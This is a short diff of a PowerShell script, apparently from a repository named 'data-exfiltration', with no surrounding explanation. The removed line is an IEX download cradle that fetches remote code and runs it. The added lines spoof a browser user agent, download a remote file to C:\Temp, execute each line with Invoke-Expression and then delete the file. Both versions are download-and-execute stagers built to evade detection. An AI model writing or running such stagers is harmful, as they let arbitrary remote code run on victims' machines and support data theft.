@@ -1,1 +1,7 @@
-powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/eternal-red/data-exfiltration/main/tests/test.txt');
+$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+Invoke-WebRequest -URI https://raw.githubusercontent.com/eternal-red/data-exfiltration/main/powershell.txt -OutFile C:\Temp\test.txt -UserAgent $useragent
+foreach($line in [System.IO.File]::ReadLines("C:\Temp\test.txt"))
+{
+       Invoke-Expression $line
+}
+Remove-Item C:\Temp\test.txt
